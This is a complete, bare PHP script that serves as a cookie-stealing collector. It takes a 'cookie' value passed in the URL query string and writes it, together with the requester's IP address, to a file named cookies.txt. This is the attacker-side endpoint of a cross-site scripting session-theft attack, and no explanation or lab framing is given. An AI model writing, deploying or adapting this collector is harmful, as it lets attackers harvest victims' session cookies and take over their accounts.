<?php
	ini_set('display_errors', 1);
	ini_set('display_startup_errors', 1);
	error_reporting(E_ALL);	

	$fp = fopen('cookies.txt', 'w');
	fwrite($fp, $_SERVER['REMOTE_ADDR'].": ".$_GET['cookie']);
	fclose($fp);
?>